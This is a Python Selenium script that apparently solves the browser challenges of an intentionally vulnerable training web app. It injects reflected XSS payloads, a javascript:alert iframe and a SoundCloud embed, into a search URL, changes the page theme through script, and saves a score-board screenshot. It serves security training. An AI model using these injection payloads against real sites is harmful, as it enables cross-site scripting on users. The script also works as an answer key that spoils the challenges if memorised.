from time import sleep

from selenium import webdriver
from urllib.parse import quote


def get_browser():
    return webdriver.Chrome()


def open_xss1_alert(server, browser):
    print('Popping reflected XSS1 in browser...'),
    script = "<iframe src='javascript:alert(\"XSS1\")'>"
    xssurl = '{}/#/search?q={}'.format(server, quote(script))
    browser.get(xssurl)
    # Sleep just to show the XSS alert
    sleep(3)
    browser.switch_to.alert.accept()
    print('Success.')

def open_bonus_xss_alert(server, browser):
    print('Popping reflected Bonus XSS in browser...'),
    script = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
    xssurl = '{}/#/search?q={}'.format(server, quote(script))
    browser.get(xssurl)
    # Sleep just to show the XSS alert
    print('Success.')

def travel_back_in_time(server, browser):
    print('Travelling back to the glorious days of Geocities...'),
    browser.get('{}/#/score-board'.format(server))
    browser.execute_script("$('#theme').attr('href', '/css/geo-bootstrap/swatch/bootstrap.css')")
    # Savour the best of themes.
    sleep(3)
    browser.refresh()
    print('Success.')


def take_screenshot_of_score_and_quit(server, browser):
    print('Taking screenshot...'),
    browser.get('{}/#/score-board'.format(server))
    with open('complete.png', 'wb') as outfile:
        outfile.write(browser.get_screenshot_as_png())
    print('complete.png saved successfully.')
    browser.quit()


def solve_browser_challenges(server):
    print('\n== BROWSER CHALLENGES ==\n')
    try:
        browser = get_browser()
    except Exception as err:
        print('Unknown Selenium exception. Have you added the Chromedriver to your PATH?\n{}'.format(repr(err)))
        return
    open_xss1_alert(server, browser)
    open_bonus_xss_alert(server, browser)
    travel_back_in_time(server, browser)
    take_screenshot_of_score_and_quit(server, browser)
    print('\n== BROWSER CHALLENGES COMPLETE ==\n')
